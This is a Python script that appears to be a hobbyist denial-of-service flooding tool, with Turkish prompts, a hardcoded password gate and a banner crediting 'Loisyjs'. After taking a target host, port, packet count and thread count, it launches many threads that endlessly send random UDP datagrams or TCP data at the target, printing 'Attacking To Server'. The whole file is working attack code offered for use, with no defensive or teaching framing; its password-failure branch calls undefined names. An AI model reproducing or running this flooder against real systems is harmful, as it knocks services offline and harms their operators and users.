import random
import socket
import threading
import time
import os,sys
import random, socket, threading

pasw = "loisyjs"

for i in range(3):
    pwd = input(" Password : ")
    j = 3
    if (pwd == pasw):
        time.sleep(2)
        print("[0] Loading...")
        time.sleep(1)
        print("[10] Loading...")
        print("[20] Loading...")
        time.sleep(1)
        print("[30] Loading...")
        time.sleep(1)
        print("[40] Loading...")
        time.sleep(1)
        print("[50] Loading...")
        time.sleep(1)
        print("[60] Loading...")
        time.sleep(1)
        print("[70] Loading...")
        time.sleep(1)
        print("[80] Loading...")
        time.sleep(1)
        print("[90] Loading...")
        time.sleep(1)
        print("[100] Processing\n")
        time.sleep(2)
        break
    else:
        time.sleep(2)
        print("[RK] SIFRE YANLIS SISTEMDEN CIKILIYOR! \n")
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Cikis yapiliyor...")
        break
        continue
time.sleep(2)
print("\033+++++++++ Giriş Başarılı Tool Yönlendiriliyor")
time.sleep(2)

os.system("")
print("""
\u001b[35m
 loisyjs is Presenting to you :

██      █████████   ██    ████████    ██        ██
██      ██     ██         ██            ██    ██
██      ██     ██   ██    ██              ████
██      ██     ██   ██    ████████         ██
██      ██     ██   ██          ██         ██
██████  █████████   ██    ████████         ██

Created by Loisyjs

""")
print("\033[32m━━━ Eglenceye Varmisin? (y/n)")
choice = str(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Host/IP")
ip = str(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Port")
port = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[32m━━━ Pakets")	
print("\033[32m━━━ Min Pakets 100")
times = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Threads")
print("\033[31m━━━ Min Threads 110")
threads = int(input("┗━>\033[0m:"))
def xxxx():
  data = random._urandom(998)
  i = random.choice(("[R+K]","[R-K]","[R/K]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Attack Ulasti")

def xxx():
  data = random._urandom(998)
  i = random.choice(("[R+K]","[R-K]","[R/K]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack")

def xx():
  data = random._urandom(871)
  i = random.choice(("[R+K]","[R-K]","[R/K]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack")

def x():
  data = random._urandom(871)
  i = random.choice(("[R+K]","[R-K]","[R/K]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = xxxx)
    th.start()
    th = threading.Thread(target = xxx)
    th.start()
  else:
    th = threading.Thread(target = xx)
    th.start()
    th = threading.Thread(target = x)
    th.start()
